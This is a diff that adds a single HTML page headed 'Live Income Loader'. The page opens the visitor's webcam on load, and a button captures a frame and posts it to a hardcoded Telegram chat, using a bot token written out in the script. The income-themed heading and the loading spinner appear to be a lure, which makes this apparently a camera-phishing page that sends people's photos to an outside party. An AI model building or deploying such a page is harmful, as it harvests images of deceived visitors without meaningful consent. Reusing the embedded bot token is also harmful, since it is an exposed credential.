@@ -1,0 +1,98 @@
+<!DOCTYPE html><html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Live Capture to Telegram</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: linear-gradient(to right, #e0f7fa, #ffffff);
+      text-align: center;
+      padding: 50px;
+    }
+    h1 {
+      color: #00796b;
+    }
+    #video {
+      border: 5px solid #26a69a;
+      border-radius: 10px;
+      width: 320px;
+      height: 240px;
+    }
+    .btn {
+      margin-top: 20px;
+      padding: 10px 20px;
+      font-size: 18px;
+      color: white;
+      background-color: #00796b;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+    }
+    .btn:hover {
+      background-color: #004d40;
+    }
+    .loader {
+      border: 6px solid #f3f3f3;
+      border-top: 6px solid #00796b;
+      border-radius: 50%;
+      width: 60px;
+      height: 60px;
+      animation: spin 1s linear infinite;
+      margin: 20px auto;
+    }
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+  </style>
+</head>
+<body>
+  <h1>Live Income Loader</h1>
+  <video id="video" autoplay muted playsinline></video>
+  <div class="loader"></div>
+  <button class="btn" onclick="captureAndSend()">Capture & Send to Telegram</button><canvas id="canvas" style="display: none;"></canvas>
+
+  <script>
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+
+    // Telegram details
+    const botToken = '8182610963:AAFcz4eIbThryJkQJ0Xb22jRM_nZBW-IxTs';
+    const chatId = '6431178492';
+
+    // Start camera
+    navigator.mediaDevices.getUserMedia({ video: true })
+      .then(stream => {
+        video.srcObject = stream;
+      })
+      .catch(err => {
+        alert('Camera access denied.');
+      });
+
+    function captureAndSend() {
+      const context = canvas.getContext('2d');
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+      canvas.toBlob(blob => {
+        const formData = new FormData();
+        formData.append('chat_id', chatId);
+        formData.append('photo', blob, 'photo.jpg');
+
+        fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+          method: 'POST',
+          body: formData
+        })
+        .then(response => response.json())
+        .then(data => {
+          console.log('Photo sent:', data);
+        })
+        .catch(error => {
+          console.error('Error sending photo:', error);
+        });
+      }, 'image/jpeg');
+    }
+  </script></body>
+  </html>
